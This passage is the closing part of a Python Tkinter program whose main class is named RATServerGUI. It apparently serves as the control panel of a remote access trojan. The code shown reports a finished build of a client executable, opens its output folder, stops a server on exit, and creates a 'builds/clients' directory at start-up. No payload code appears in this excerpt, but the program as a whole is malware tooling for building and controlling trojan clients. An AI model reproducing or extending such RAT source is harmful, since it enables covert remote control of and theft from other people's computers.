                            f"Executable créé:\n{p}\n\nOuvrir le dossier?",
                            icon="info"
                        )
                        if answer == "yes":
                            if platform.system() == "Windows":
                                subprocess.Popen(f'explorer /select,"{p}"')
                            elif platform.system() == "Darwin":
                                subprocess.Popen(["open", "-R", p])
                            else:
                                subprocess.Popen(["xdg-open", d])

                    self.root.after(0, _show_result)
                    return True
                else:
                    err = result.stderr[-600:] if result.stderr else "Erreur inconnue"
                    self.root.after(0, lambda: self.log_message(f"Build échoué: {err}", "error"))
                    self.root.after(0, lambda: messagebox.showerror("Build échoué", err[:300]))
                    return False

            except Exception as e:
                err_msg = str(e)
                self.root.after(0, lambda: self.log_message(f"Build error: {err_msg}", "error"))
                return False

        threading.Thread(target=_build, daemon=True).start()
        return True

    def on_closing(self):
        if messagebox.askokcancel("Exit", "Stop server and exit?"):
            if self.server_socket: self.stop_server()
            self.root.destroy()


if __name__ == "__main__":
    os.makedirs("dist", exist_ok=True)
    os.makedirs(os.path.join("builds", "clients"), exist_ok=True)
    root = tk.Tk()
    app = RATServerGUI(root)
    root.mainloop()
